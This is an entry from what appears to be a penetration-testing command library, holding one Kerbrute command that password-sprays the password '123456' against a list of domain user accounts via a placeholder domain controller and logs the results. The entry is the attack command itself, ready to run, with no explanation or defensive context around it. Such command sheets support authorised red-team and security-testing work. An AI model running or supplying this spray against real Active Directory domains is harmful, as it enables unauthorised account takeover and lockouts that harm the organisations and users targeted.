---
id: 0aabab3e-5d82-4b81-a2ed-896386ba97b9
name: Kerbrute Password Spray with domain_users.txt and 123456
type: command
executor: bash
data: ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt
  '123456' -v --delay 100 -o kerbrute-passwordspray-123456.log
output: null
created_at: '2023-04-06T03:56:04.255621+00:00'
updated_at: '2023-04-10T20:36:09.930886+00:00'
---

# Kerbrute Password Spray with domain_users.txt and 123456

```bash
./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 domain_users.txt '123456' -v --delay 100 -o kerbrute-passwordspray-123456.log
```


